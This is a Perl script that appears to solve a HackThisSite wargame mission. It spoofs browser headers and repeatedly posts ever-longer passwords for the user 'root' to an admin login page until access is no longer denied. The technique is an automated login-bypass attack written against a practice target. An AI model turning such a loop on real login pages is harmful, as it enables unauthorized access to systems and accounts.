#!/bin/perl
use LWP::UserAgent;

$browser = LWP::UserAgent->new;
$user_agent = 'Mozilla/5.0 (Linux; U; Android 2.2; en-us; Ideos Build/FRF91) AppleWebKit/533.1 Mobile Safari/533.1';
@header = ('Referer'=>'http://www.hackthissite.org/missions/realistic/15/admin_area/viewpatents.php', 'User-Agent'=>$user_agent);

for($i=0;;$i++)
{
	%postLoginData=(
		     password=>"Y"x($i+200),
		     username=>"root"
	);
	$response = $browser->post('http://www.hackthissite.org/missions/realistic/15/admin_area/viewpatents2.php',\%postLoginData,@header);
	print $response;
	$result = $response->content;
	
	if (($result !~ /Access denied!/))
	{
		print $result . "\n";
		print $i . "\n";
		exit;
	}
	else
	{
		print $result . "\n";
	}
}
